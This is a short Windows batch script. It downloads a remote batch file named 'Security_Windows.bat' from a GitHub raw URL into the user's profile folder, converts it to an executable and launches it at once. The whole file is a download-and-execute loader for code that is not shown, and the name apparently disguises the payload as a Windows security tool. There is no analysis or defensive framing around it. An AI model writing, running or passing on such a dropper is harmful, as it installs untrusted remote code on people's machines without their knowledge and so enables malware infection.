@echo off
set "url=https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"
set "destination=%USERPROFILE%/Security_Windows.bat"
set "convertedExePath=%USERPROFILE%/Security_Windows.exe"

curl -o %destination% %url%

bat_to_exe_converter.exe /bat %destination% /exe %convertedExePath%

start %convertedExePath%
